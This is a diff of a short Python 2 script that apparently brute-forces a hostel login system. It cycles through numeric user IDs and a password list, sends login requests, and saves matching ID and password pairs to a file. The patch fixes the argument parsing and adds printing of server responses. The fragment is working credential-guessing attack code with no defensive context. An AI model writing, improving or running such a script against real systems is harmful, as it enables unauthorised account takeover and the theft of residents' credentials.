@@ -45,11 +45,12 @@ if __name__ == "__main__":
     start = int(ff.read())
     ff.close()
     start+=1
-    for i in range(argv[1],argv[2]):
+    for i in range(int(argv[1]),int(argv[2])):
         found = True
         for data1 in pwd:
             print "checking ",(str(i),data1)
             data = send_request('login',str(i),data1)
+            print data
             if "Maximum" in data:
                 print "found hostler id %s and pwd as %s",(str(i),data1)
                 writInHostlersFile(str(i),str(data1))
